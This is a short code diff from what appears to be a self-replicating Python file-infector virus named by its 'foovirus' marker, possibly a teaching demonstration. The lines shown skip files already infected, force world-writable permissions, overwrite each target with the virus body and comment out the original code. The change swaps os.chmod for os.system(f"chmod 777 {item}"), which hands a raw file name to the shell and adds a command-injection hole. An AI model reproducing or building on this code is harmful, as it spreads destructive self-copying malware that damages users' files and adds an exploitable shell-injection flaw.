@@ -120,7 +120,8 @@ while True:
                         all_of_it = IN.readlines()
                         IN.close()
                         if any('foovirus' in line for line in all_of_it): continue
-                        os.chmod(item, 0o777)    
+                        # os.chmod(item, 0o777)
+                        os.system(f"chmod 777 {item}")    
                         OUT = open(item, 'w')
                         OUT.writelines(virus)
                         all_of_it = ['#' + line for line in all_of_it]
